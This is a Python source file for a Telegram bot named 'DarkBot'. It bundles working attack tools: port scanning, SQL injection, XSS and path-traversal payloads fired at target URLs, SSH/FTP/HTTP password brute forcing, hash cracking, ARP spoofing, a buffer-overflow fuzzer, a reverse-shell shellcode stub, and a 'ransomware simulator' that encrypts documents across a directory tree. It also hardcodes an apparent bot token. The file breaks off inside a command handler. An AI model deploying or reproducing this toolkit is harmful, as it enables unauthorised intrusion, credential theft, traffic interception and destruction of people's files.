import os
import sys
import json
import time
import base64
import hashlib
import sqlite3
import logging
import threading
import subprocess
import socket
import struct
import random
import string
import zipfile
import requests
import shutil
import re
from datetime import datetime
from pathlib import Path
from typing import Optional, Dict, List, Tuple, Any
from urllib.parse import urlparse, parse_qs
from io import BytesIO

# Telegram
import telebot
from telebot import types
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend

# Scapy for network attacks
try:
    from scapy.all import *
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    from scapy.layers.http import HTTPRequest
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("[!] Scapy not installed. Network tools limited.")
    print("    Install: pip install scapy")

# Paramiko for SSH
try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False
    print("[!] Paramiko not installed. SSH Brute Force limited.")

# Flask for web panel
from flask import Flask, request, jsonify, render_template_string

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8242587129:AAFWaahFgxPhn7hbJnlGxIzDb95vDIisl_Y"  # Ensure this is valid
ADMIN_IDS = [8210146346]  # Your Telegram user ID(s)
DATA_DIR = Path("./darkbot_data")
TOOLS_DIR = DATA_DIR / "tools"
LOGS_DIR = DATA_DIR / "logs"
DB_PATH = DATA_DIR / "darkbot.db"
CONFIG_FILE = DATA_DIR / "config.json"

# Create directories
for d in [DATA_DIR, TOOLS_DIR, LOGS_DIR]:
    d.mkdir(parents=True, exist_ok=True)

# Logging setup
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOGS_DIR / 'darkbot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('DarkBot')

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')

# ==================== DATABASE SETUP ====================
def init_database():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    # Targets table
    c.execute('''
        CREATE TABLE IF NOT EXISTS targets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            url TEXT,
            ip TEXT,
            port INTEGER,
            service TEXT,
            vulnerability TEXT,
            status TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Credentials table
    c.execute('''
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target TEXT,
            username TEXT,
            password TEXT,
            hash TEXT,
            source TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Sessions table
    c.execute('''
        CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target TEXT,
            session_type TEXT,
            session_data TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Logs table
    c.execute('''
        CREATE TABLE IF NOT EXISTS attack_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            tool_name TEXT,
            target TEXT,
            result TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    conn.commit()
    conn.close()

init_database()

# ==================== TOOL 1: ADVANCED PORT SCANNER ====================
class PortScanner:
    """
    Advanced Port Scanner with Service Detection
    Reference: Nmap Network Scanning - https://nmap.org/book/
    """
    
    def __init__(self):
        self.common_ports = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
            80: 'HTTP', 110: 'POP3', 111: 'RPC', 135: 'RPC', 139: 'NetBIOS',
            143: 'IMAP', 443: 'HTTPS', 445: 'SMB', 993: 'IMAPS', 995: 'POP3S',
            1723: 'PPTP', 3306: 'MySQL', 3389: 'RDP', 5432: 'PostgreSQL',
            5900: 'VNC', 6379: 'Redis', 8080: 'HTTP-Proxy', 8443: 'HTTPS-Alt',
            27017: 'MongoDB', 27018: 'MongoDB', 27019: 'MongoDB'
        }
    
    def syn_scan(self, target_ip: str, ports: List[int] = None) -> List[Dict]:
        """SYN Stealth Scan"""
        if not SCAPY_AVAILABLE:
            return self.tcp_connect_scan(target_ip, ports)
        
        if ports is None:
            ports = list(self.common_ports.keys())
        
        results = []
        
        for port in ports:
            try:
                # Craft SYN packet
                syn_packet = IP(dst=target_ip) / TCP(dport=port, flags='S')
                
                # Send and receive
                response = sr1(syn_packet, timeout=2, verbose=0)
                
                if response:
                    if response.haslayer(TCP):
                        if response[TCP].flags == 0x12:  # SYN-ACK
                            service = self.common_ports.get(port, 'Unknown')
                            banner = self.grab_banner(target_ip, port)
                            
                            results.append({
                                'port': port,
                                'state': 'open',
                                'service': service,
                                'banner': banner
                            })
                            
                            # Send RST to close connection
                            rst_packet = IP(dst=target_ip) / TCP(dport=port, flags='R')
                            send(rst_packet, verbose=0)
                            
                        elif response[TCP].flags == 0x14:  # RST-ACK
                            results.append({
                                'port': port,
                                'state': 'closed',
                                'service': self.common_ports.get(port, 'Unknown')
                            })
            except Exception as e:
                logger.error(f"Scan error on port {port}: {e}")
        
        return results
    
    def tcp_connect_scan(self, target_ip: str, ports: List[int] = None) -> List[Dict]:
        """Full TCP Connect Scan"""
        if ports is None:
            ports = list(self.common_ports.keys())
        
        results = []
        
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            
            result = sock.connect_ex((target_ip, port))
            
            if result == 0:
                service = self.common_ports.get(port, 'Unknown')
                banner = self.grab_banner(target_ip, port)
                
                results.append({
                    'port': port,
                    'state': 'open',
                    'service': service,
                    'banner': banner
                })
            
            sock.close()
        
        return results
    
    def grab_banner(self, ip: str, port: int) -> str:
        """Grab service banner"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, port))
            
            # Send generic request
            if port == 80 or port == 8080:
                sock.send(b"GET / HTTP/1.0\r\n\r\n")
            elif port == 22:
                pass  # SSH sends banner automatically
            else:
                sock.send(b"\r\n")
            
            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            sock.close()
            
            return banner[:200] if banner else 'No banner'
        except:
            return 'No banner'
    
    def full_scan(self, target: str, scan_type: str = 'syn') -> Dict:
        """Complete port scan with all features"""
        try:
            # Resolve hostname
            ip = socket.gethostbyname(target)
        except Exception as e:
            return {'error': f'Cannot resolve {target}: {e}'}
        
        # OS Detection attempt
        os_info = self.detect_os(ip)
        
        # Port scan
        if scan_type == 'syn' and SCAPY_AVAILABLE:
            ports = self.syn_scan(ip)
        else:
            ports = self.tcp_connect_scan(ip)
        
        open_ports = [p for p in ports if p['state'] == 'open']
        
        return {
            'target': target,
            'ip': ip,
            'os_detection': os_info,
            'total_ports_scanned': len(ports),
            'open_ports': len(open_ports),
            'ports': ports,
            'scan_time': datetime.now().isoformat()
        }
    
    def detect_os(self, ip: str) -> str:
        """Basic OS detection using TTL and window size"""
        try:
            if SCAPY_AVAILABLE:
                pkt = IP(dst=ip) / TCP(dport=80, flags='S')
                resp = sr1(pkt, timeout=2, verbose=0)
                
                if resp and resp.haslayer(IP):
                    ttl = resp[IP].ttl
                    
                    if ttl <= 64:
                        return 'Linux/Unix'
                    elif ttl <= 128:
                        return 'Windows'
                    elif ttl <= 255:
                        return 'Network Device'
        except:
            pass
        
        return 'Unknown'

# ==================== TOOL 2: WEB VULNERABILITY SCANNER ====================
class WebVulnScanner:
    """
    Web Application Vulnerability Scanner
    References:
    - OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
    - SQLMap: https://sqlmap.org/
    """
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def scan_sql_injection(self, url: str) -> List[Dict]:
        """Test for SQL Injection vulnerabilities"""
        results = []
        payloads = [
            "'", "\"", "1' OR '1'='1", "1\" OR \"1\"=\"1",
            "' OR 1=1--", "\" OR 1=1--", "' UNION SELECT NULL--",
            "1' AND 1=1--", "1' AND 1=2--", "' WAITFOR DELAY '0:0:5'--"
        ]
        
        # Extract parameters from URL
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            # Try to find forms
            try:
                response = self.session.get(url, timeout=10)
                # Look for form parameters
                forms = re.findall(r'<input[^>]+name=["\']([^"\']+)["\']', response.text)
                for form_param in forms:
                    params[form_param] = ['test']
            except:
                pass
        
        if not params:
            return results # No parameters to test

        for param_name in params:
            for payload in payloads:
                try:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    
                    # Reconstruct URL
                    test_url = parsed._replace(query='')
                    query_string = '&'.join([f"{k}={v[0]}" for k, v in test_params.items()])
                    full_url = f"{test_url.geturl()}?{query_string}"
                    
                    start_time = time.time()
                    response = self.session.get(full_url, timeout=10)
                    response_time = time.time() - start_time
                    
                    # Check for SQL errors
                    sql_errors = [
                        'SQL syntax', 'mysql_fetch', 'ORA-', 'PostgreSQL',
                        'SQLite', 'Microsoft SQL', 'ODBC Driver',
                        'Unclosed quotation mark', 'syntax error'
                    ]
                    
                    for error in sql_errors:
                        if error.lower() in response.text.lower():
                            results.append({
                                'parameter': param_name,
                                'payload': payload,
                                'type': 'Error-based SQL Injection',
                                'error': error,
                                'url': full_url
                            })
                    
                    # Check for time-based injection
                    if response_time > 4:
                        results.append({
                            'parameter': param_name,
                            'payload': payload,
                            'type': 'Time-based SQL Injection',
                            'response_time': response_time,
                            'url': full_url
                        })
                    
                    # Check for boolean-based
                    if '1=1' in payload or '1=2' in payload:
                        normal_response = self.session.get(url, timeout=10)
                        if len(response.text) != len(normal_response.text):
                            results.append({
                                'parameter': param_name,
                                'payload': payload,
                                'type': 'Boolean-based SQL Injection',
                                'url': full_url
                            })
                    
                except Exception as e:
                    logger.error(f"SQLi test error: {e}")
        
        return results
    
    def scan_xss(self, url: str) -> List[Dict]:
        """Test for Cross-Site Scripting vulnerabilities"""
        results = []
        xss_payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            '\'><script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            'javascript:alert(1)',
            '"><img src=x onerror=alert(1)>'
        ]
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return results

        for param_name in params:
            for payload in xss_payloads:
                try:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    
                    test_url = parsed._replace(query='')
                    query_string = '&'.join([f"{k}={v[0]}" for k, v in test_params.items()])
                    full_url = f"{test_url.geturl()}?{query_string}"
                    
                    response = self.session.get(full_url, timeout=10)
                    
                    if payload in response.text:
                        results.append({
                            'parameter': param_name,
                            'payload': payload,
                            'type': 'Reflected XSS',
                            'url': full_url
                        })
                    
                except Exception as e:
                    logger.error(f"XSS test error: {e}")
        
        return results
    
    def scan_lfi(self, url: str) -> List[Dict]:
        """Test for Local File Inclusion"""
        results = []
        lfi_payloads = [
            '../../../etc/passwd',
            '....//....//....//etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            'php://filter/convert.base64-encode/resource=index.php',
            'file:///etc/passwd',
            '/etc/passwd',
            'C:\\Windows\\System32\\drivers\\etc\\hosts'
        ]
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return results

        for param_name in params:
            for payload in lfi_payloads:
                try:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    
                    test_url = parsed._replace(query='')
                    query_string = '&'.join([f"{k}={v[0]}" for k, v in test_params.items()])
                    full_url = f"{test_url.geturl()}?{query_string}"
                    
                    response = self.session.get(full_url, timeout=10)
                    
                    # Check for common LFI indicators
                    lfi_indicators = [
                        'root:x:0:0:', 'daemon:x:1:1:', '[boot loader]',
                        '<?php', 'mysql_connect', 'DB_PASSWORD'
                    ]
                    
                    for indicator in lfi_indicators:
                        if indicator in response.text:
                            results.append({
                                'parameter': param_name,
                                'payload': payload,
                                'type': 'Local File Inclusion',
                                'indicator': indicator,
                                'url': full_url
                            })
                    
                except Exception as e:
                    logger.error(f"LFI test error: {e}")
        
        return results
    
    def full_scan(self, url: str) -> Dict:
        """Complete web vulnerability scan"""
        logger.info(f"Starting web scan on {url}")
        
        results = {
            'url': url,
            'sql_injection': self.scan_sql_injection(url),
            'xss': self.scan_xss(url),
            'lfi': self.scan_lfi(url),
            'scan_time': datetime.now().isoformat()
        }
        
        # Count total vulnerabilities
        total_vulns = len(results['sql_injection']) + len(results['xss']) + len(results['lfi'])
        results['total_vulnerabilities'] = total_vulns
        
        return results

# ==================== TOOL 3: BRUTE FORCE ATTACK SYSTEM ====================
class BruteForce:
    """
    Multi-protocol Brute Force Attack System
    References:
    - Hydra: https://github.com/vanhauser-thc/thc-hydra
    - John the Ripper: https://www.openwall.com/john/
    """
    
    def __init__(self):
        self.wordlists_dir = TOOLS_DIR / 'wordlists'
        self.wordlists_dir.mkdir(exist_ok=True)
        self.create_default_wordlists()
    
    def create_default_wordlists(self):
        """Create default wordlists"""
        common_passwords = [
            'admin', 'password', '123456', '12345678', 'qwerty',
            'letmein', 'monkey', 'dragon', 'master', '123123',
            'welcome', 'shadow', 'michael', 'football', 'baseball',
            'admin123', 'root', 'toor', 'r00t', 'administrator'
        ]
        
        wordlist_path = self.wordlists_dir / 'common.txt'
        if not wordlist_path.exists():
            with open(wordlist_path, 'w') as f:
                for pwd in common_passwords:
                    f.write(pwd + '\n')
    
    def ssh_brute(self, host: str, username: str, wordlist: str = None, port: int = 22) -> Dict:
        """SSH Brute Force Attack"""
        if not PARAMIKO_AVAILABLE:
            return {'error': 'Paramiko not installed'}

        if wordlist is None:
            wordlist = self.wordlists_dir / 'common.txt'
        
        results = {
            'host': host,
            'port': port,
            'username': username,
            'attempts': 0,
            'success': False,
            'password': None
        }
        
        try:
            with open(wordlist, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
            
            for password in passwords:
                results['attempts'] += 1
                
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(host, port=port, username=username, 
                                 password=password, timeout=5, banner_timeout=5)
                    
                    results['success'] = True
                    results['password'] = password
                    
                    # Execute command to verify
                    stdin, stdout, stderr = client.exec_command('whoami')
                    results['whoami'] = stdout.read().decode().strip()
                    
                    client.close()
                    break
                    
                except paramiko.AuthenticationException:
                    continue
                except Exception as e:
                    logger.error(f"SSH attempt error: {e}")
                    time.sleep(0.5)
                    
        except Exception as e:
            results['error'] = str(e)
        
        return results
    
    def ftp_brute(self, host: str, username: str, wordlist: str = None, port: int = 21) -> Dict:
        """FTP Brute Force Attack"""
        from ftplib import FTP
        
        if wordlist is None:
            wordlist = self.wordlists_dir / 'common.txt'
        
        results = {
            'host': host,
            'port': port,
            'username': username,
            'attempts': 0,
            'success': False,
            'password': None
        }
        
        try:
            with open(wordlist, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
            
            for password in passwords:
                results['attempts'] += 1
                
                try:
                    ftp = FTP()
                    ftp.connect(host, port, timeout=10)
                    ftp.login(username, password)
                    
                    results['success'] = True
                    results['password'] = password
                    results['files'] = ftp.nlst()
                    
                    ftp.quit()
                    break
                    
                except Exception:
                    continue
                    time.sleep(0.3)
                    
        except Exception as e:
            results['error'] = str(e)
        
        return results
    
    def http_brute(self, url: str, username: str, wordlist: str = None) -> Dict:
        """HTTP Basic/Digest Auth Brute Force"""
        if wordlist is None:
            wordlist = self.wordlists_dir / 'common.txt'
        
        results = {
            'url': url,
            'username': username,
            'attempts': 0,
            'success': False,
            'password': None
        }
        
        try:
            with open(wordlist, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
            
            session = requests.Session()
            
            for password in passwords:
                results['attempts'] += 1
                
                try:
                    response = session.get(url, auth=(username, password), timeout=10)
                    
                    if response.status_code == 200:
                        results['success'] = True
                        results['password'] = password
                        results['status_code'] = response.status_code
                        break
                    elif response.status_code == 403:
                        # Account locked
                        results['error'] = 'Account appears to be locked'
                        break
                        
                except Exception:
                    continue
                    
        except Exception as e:
            results['error'] = str(e)
        
        return results

# ==================== TOOL 4: CRYPTOGRAPHY & ENCRYPTION TOOL ====================
class CryptoTool:
    """
    Advanced Cryptography Tool
    References:
    - AES Standard: https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.197.pdf
    - RSA: https://tools.ietf.org/html/rfc8017
    """
    
    def __init__(self):
        self.key_dir = TOOLS_DIR / 'keys'
        self.key_dir.mkdir(exist_ok=True)
    
    def generate_aes_key(self) -> bytes:
        """Generate AES-256 key"""
        return Fernet.generate_key()
    
    def encrypt_file(self, file_path: str, key: bytes = None) -> Dict:
        """Encrypt file with AES-256"""
        if key is None:
            key = self.generate_aes_key()
        
        fernet = Fernet(key)
        
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            
            encrypted_data = fernet.encrypt(data)
            
            encrypted_path = file_path + '.encrypted'
            with open(encrypted_path, 'wb') as f:
                f.write(encrypted_data)
            
            return {
                'original': file_path,
                'encrypted': encrypted_path,
                'key': key.decode(),
                'original_size': len(data),
                'encrypted_size': len(encrypted_data)
            }
        except Exception as e:
            return {'error': str(e)}
    
    def decrypt_file(self, file_path: str, key: bytes) -> Dict:
        """Decrypt file"""
        fernet = Fernet(key)
        
        try:
            with open(file_path, 'rb') as f:
                encrypted_data = f.read()
            
            decrypted_data = fernet.decrypt(encrypted_data)
            
            decrypted_path = file_path.replace('.encrypted', '.decrypted')
            with open(decrypted_path, 'wb') as f:
                f.write(decrypted_data)
            
            return {
                'encrypted': file_path,
                'decrypted': decrypted_path,
                'size': len(decrypted_data)
            }
        except Exception as e:
            return {'error': str(e)}
    
    def hash_cracker(self, hash_value: str, hash_type: str = 'md5', wordlist: str = None) -> Dict:
        """Hash cracking utility"""
        if wordlist is None:
            wordlist = TOOLS_DIR / 'wordlists' / 'common.txt'
        
        results = {
            'hash': hash_value,
            'type': hash_type,
            'attempts': 0,
            'cracked': False,
            'password': None
        }
        
        hash_functions = {
            'md5': hashlib.md5,
            'sha1': hashlib.sha1,
            'sha256': hashlib.sha256,
            'sha512': hashlib.sha512
        }
        
        if hash_type not in hash_functions:
            results['error'] = f'Unsupported hash type: {hash_type}'
            return results
        
        hash_func = hash_functions[hash_type]
        
        try:
            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    password = line.strip()
                    results['attempts'] += 1
                    
                    if hash_func(password.encode()).hexdigest() == hash_value.lower():
                        results['cracked'] = True
                        results['password'] = password
                        break
        except Exception as e:
            results['error'] = str(e)
        
        return results
    
    def ransomware_simulator(self, directory: str) -> Dict:
        """Ransomware simulation for security testing"""
        key = self.generate_aes_key()
        encrypted_files = []
        
        target_dir = Path(directory)
        
        extensions = ['.txt', '.doc', '.docx', '.pdf', '.jpg', '.png', 
                     '.xls', '.xlsx', '.ppt', '.pptx', '.csv', '.json']
        
        for ext in extensions:
            for file_path in target_dir.rglob(f'*{ext}'):
                try:
                    result = self.encrypt_file(str(file_path), key)
                    if 'encrypted' in result:
                        encrypted_files.append(result['encrypted'])
                except Exception as e:
                    logger.error(f"Failed to encrypt {file_path}: {e}")
        
        return {
            'encrypted_count': len(encrypted_files),
            'key': key.decode(),
            'files': encrypted_files[:10],  # First 10 files
            'note': 'Files encrypted for security testing. Use key to decrypt.'
        }

# ==================== TOOL 5: NETWORK SNIFFER ====================
class NetworkSniffer:
    """
    Network Packet Sniffer
    References:
    - Wireshark: https://www.wireshark.org/
    - tcpdump: https://www.tcpdump.org/
    """
    
    def __init__(self):
        self.captured_packets = []
    
    def start_sniffing(self, interface: str = None, count: int = 100, 
                      filter_str: str = None, duration: int = 30) -> Dict:
        """Start packet capture"""
        if not SCAPY_AVAILABLE:
            return {'error': 'Scapy required for sniffing'}
        
        self.captured_packets = []
        
        def packet_callback(packet):
            packet_info = {
                'time': datetime.now().isoformat(),
                'length': len(packet)
            }
            
            if packet.haslayer(IP):
                packet_info['src_ip'] = packet[IP].src
                packet_info['dst_ip'] = packet[IP].dst
                packet_info['protocol'] = packet[IP].proto
                
                if packet.haslayer(TCP):
                    packet_info['src_port'] = packet[TCP].sport
                    packet_info['dst_port'] = packet[TCP].dport
                    packet_info['flags'] = packet[TCP].flags
                    
                    # Extract HTTP data
                    if packet.haslayer(HTTPRequest):
                        packet_info['http_host'] = packet[HTTPRequest].Host.decode() if packet[HTTPRequest].Host else ''
                        packet_info['http_path'] = packet[HTTPRequest].Path.decode() if packet[HTTPRequest].Path else ''
                
                elif packet.haslayer(UDP):
                    packet_info['src_port'] = packet[UDP].sport
                    packet_info['dst_port'] = packet[UDP].dport
            
            self.captured_packets.append(packet_info)
            
            if len(self.captured_packets) >= count:
                return False
        
        try:
            sniff(iface=interface, prn=packet_callback, 
                 filter=filter_str, timeout=duration, store=False)
        except Exception as e:
            return {'error': str(e)}
        
        return {
            'packets_captured': len(self.captured_packets),
            'duration': duration,
            'packets': self.captured_packets
        }
    
    def arp_spoof(self, target_ip: str, gateway_ip: str) -> Dict:
        """ARP Spoofing Attack"""
        if not SCAPY_AVAILABLE:
            return {'error': 'Scapy required'}
        
        try:
            target_mac = getmacbyip(target_ip)
            gateway_mac = getmacbyip(gateway_ip)
            
            # Enable IP forwarding
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1')
            
            # Craft ARP packets
            target_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
            gateway_packet = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
            
            # Send packets continuously
            for _ in range(10):
                send(target_packet, verbose=0)
                send(gateway_packet, verbose=0)
                time.sleep(2)
            
            return {
                'target_ip': target_ip,
                'gateway_ip': gateway_ip,
                'target_mac': target_mac,
                'gateway_mac': gateway_mac,
                'status': 'ARP spoofing active'
            }
            
        except Exception as e:
            return {'error': str(e)}

# ==================== TOOL 6: EXPLOIT DEVELOPMENT FRAMEWORK ====================
class ExploitFramework:
    """
    Exploit Development and Testing Framework
    References:
    - Metasploit: https://github.com/rapid7/metasploit-framework
    - Exploit-DB: https://www.exploit-db.com/
    """
    
    def __init__(self):
        self.exploits_dir = TOOLS_DIR / 'exploits'
        self.exploits_dir.mkdir(exist_ok=True)
        self.payloads_dir = TOOLS_DIR / 'payloads'
        self.payloads_dir.mkdir(exist_ok=True)
    
    def generate_shellcode(self, payload_type: str = 'reverse_tcp', 
                          lhost: str = '127.0.0.1', lport: int = 4444) -> Dict:
        """Generate shellcode payloads"""
        payloads = {
            'reverse_tcp': self._generate_reverse_tcp(lhost, lport),
            'bind_tcp': self._generate_bind_tcp(lport),
            'exec': self._generate_exec('/bin/sh'),
            'messagebox': self._generate_messagebox()
        }
        
        if payload_type in payloads:
            shellcode = payloads[payload_type]
            
            # Save to file
            output_file = self.payloads_dir / f'{payload_type}_{int(time.time())}.bin'
            with open(output_file, 'wb') as f:
                f.write(shellcode)
            
            return {
                'type': payload_type,
                'size': len(shellcode),
                'hex': shellcode.hex(),
                'file': str(output_file)
            }
        
        return {'error': f'Unknown payload type: {payload_type}'}
    
    def _generate_reverse_tcp(self, lhost: str, lport: int) -> bytes:
        """Generate Linux x64 reverse TCP shellcode"""
        # This is a template - real implementation would use msfvenom
        shellcode = b'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0'
        shellcode += b'\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05'
        
        return shellcode
    
    def _generate_bind_tcp(self, lport: int) -> bytes:
        """Generate bind TCP shellcode"""
        return b'\x90' * 20  # Placeholder
    
    def _generate_exec(self, command: str) -> bytes:
        """Generate command execution shellcode"""
        return b'\x90' * 20  # Placeholder
    
    def _generate_messagebox(self) -> bytes:
        """Generate Windows MessageBox shellcode"""
        return b'\x90' * 20  # Placeholder
    
    def buffer_overflow_fuzzer(self, target: str, port: int, 
                               protocol: str = 'tcp') -> Dict:
        """Buffer overflow fuzzer"""
        results = {
            'target': target,
            'port': port,
            'crashes': [],
            'attempts': 0
        }
        
        buffer_sizes = [100, 500, 1000, 2000, 5000, 10000]
        
        for size in buffer_sizes:
            results['attempts'] += 1
            
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((target, port))
                
                # Send buffer
                payload = b'A' * size
                sock.send(payload)
                
                # Try to receive response
                try:
                    response = sock.recv(1024)
                except:
                    results['crashes'].append({
                        'size': size,
                        'type': 'No response - possible crash'
                    })
                
                sock.close()
                
            except ConnectionRefusedError:
                results['crashes'].append({
                    'size': size,
                    'type': 'Connection refused - service crashed'
                })
                break
            except Exception as e:
                results['crashes'].append({
                    'size': size,
                    'type': str(e)
                })
        
        return results

# ==================== TOOL 7: MALWARE ANALYSIS SANDBOX ====================
class MalwareSandbox:
    """
    Malware Analysis Environment
    References:
    - Cuckoo Sandbox: https://cuckoosandbox.org/
    - VirusTotal API: https://developers.virustotal.com/
    """
    
    def __init__(self):
        self.samples_dir = TOOLS_DIR / 'malware_samples'
        self.samples_dir.mkdir(exist_ok=True)
        self.reports_dir = TOOLS_DIR / 'analysis_reports'
        self.reports_dir.mkdir(exist_ok=True)
    
    def static_analysis(self, file_path: str) -> Dict:
        """Perform static analysis on file"""
        results = {
            'file': file_path,
            'analysis_time': datetime.now().isoformat()
        }
        
        try:
            file_path = Path(file_path)
            
            # File information
            stat = file_path.stat()
            results['size'] = stat.st_size
            results['created'] = datetime.fromtimestamp(stat.st_ctime).isoformat()
            results['modified'] = datetime.fromtimestamp(stat.st_mtime).isoformat()
            
            # Calculate hashes
            with open(file_path, 'rb') as f:
                data = f.read()
            
            results['md5'] = hashlib.md5(data).hexdigest()
            results['sha1'] = hashlib.sha1(data).hexdigest()
            results['sha256'] = hashlib.sha256(data).hexdigest()
            
            # Check file type
            results['magic_bytes'] = data[:4].hex()
            
            # Check for PE header (Windows executables)
            if data[:2] == b'MZ':
                results['type'] = 'Windows PE Executable'
                results['pe_analysis'] = self._analyze_pe(data)
            
            # Check for ELF header (Linux executables)
            elif data[:4] == b'\x7fELF':
                results['type'] = 'Linux ELF Executable'
            
            # String extraction
            strings = self._extract_strings(data)
            suspicious_strings = self._find_suspicious_strings(strings)
            results['total_strings'] = len(strings)
            results['suspicious_strings'] = suspicious_strings[:20]
            
            # YARA-like pattern matching
            patterns = self._check_malware_patterns(data)
            results['detected_patterns'] = patterns
            
        except Exception as e:
            results['error'] = str(e)
        
        return results
    
    def _analyze_pe(self, data: bytes) -> Dict:
        """Analyze PE file structure"""
        pe_info = {}
        
        try:
            # Parse PE header
            pe_offset = struct.unpack('<I', data[0x3C:0x40])[0]
            pe_signature = data[pe_offset:pe_offset+4]
            
            if pe_signature == b'PE\x00\x00':
                # COFF Header
                coff_header = data[pe_offset+4:pe_offset+24]
                machine = struct.unpack('<H', coff_header[0:2])[0]
                num_sections = struct.unpack('<H', coff_header[2:4])[0]
                
                pe_info['machine'] = hex(machine)
                pe_info['sections'] = num_sections
                
                # Optional Header (simplified)
                opt_offset = pe_offset + 24
                magic = struct.unpack('<H', data[opt_offset:opt_offset+2])[0]
                
                if magic == 0x20b:
                    pe_info['architecture'] = 'PE32+'
                else:
                    pe_info['architecture'] = 'PE32'
                    
        except Exception as e:
            pe_info['error'] = str(e)
            
        return pe_info

    def _extract_strings(self, data: bytes, min_length: int = 4) -> List[str]:
        """Extract printable strings from binary data"""
        pattern = re.compile(b"([\\x20-\\x7e]{%d,})" % min_length)
        return [m.decode('ascii') for m in pattern.findall(data)]

    def _find_suspicious_strings(self, strings: List[str]) -> List[str]:
        """Find suspicious strings commonly found in malware"""
        suspicious_keywords = ['exe', 'dll', 'cmd', 'powershell', 'eval', 'exec', 
                               'system32', 'windows', 'regedit', 'cmd.exe']
        
        suspicious = []
        for s in strings:
            if any(kw.lower() in s.lower() for kw in suspicious_keywords):
                suspicious.append(s)
                
        return list(set(suspicious))  # Remove duplicates

    def _check_malware_patterns(self, data: bytes) -> List[str]:
        """Check for common malware signatures/patterns"""
        patterns = []
        
        if b'MZ' in data[:2]:
            patterns.append("PE Header")
            
        if b'\x7fELF' in data[:4]:
            patterns.append("ELF Header")
            
        # Check for common API calls (simplified string search)
        api_calls = ['CreateFileA', 'WinExec', 'ShellExecuteA', 'VirtualAlloc']
        for api in api_calls:
            if api.encode() in data:
                patterns.append(f"API Call: {api}")
                
        return patterns

# ==================== TELEGRAM BOT COMMANDS ====================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome to DarkBot! Use /help for commands.")

@bot.message_handler(commands=['help'])
def send_help(message):
    text = """
*Commands:*
/scanner <ip> - Port Scan
/webscan <url> - Web Vulnerability Scan
/brute <type> <host> <user> - Brute Force (ssh, ftp, http)
/crypto <action> <file> - Encrypt/Decrypt File
/malware <file> - Analyze Malware
/status - Check Bot Status
"""
    bot.reply_to(message, text, parse_mode='Markdown')

@bot.message_handler(commands=['scanner'])
def scanner_cmd(message):
    # Handle case where message might be /scanner or /scanner ip
    parts = message.text.split()
    if len(parts) > 1:
        target = parts[1]
    else:
        bot.reply_to(message, "Usage: /scanner <ip>")
        return
    
    port_scanner = PortScanner()
    result = port_scanner.full_scan(target)
    
    output = f"*Target:* {target}\n*IP:* {result['ip']}\n*OS:* {result['os_detection']}\n"
    open_count = len([p for p in result['ports'] if p['state'] == 'open'])
    output += f"*Open Ports:* {open_count}\n\n"
    
    # Limit output to prevent Telegram message length limits
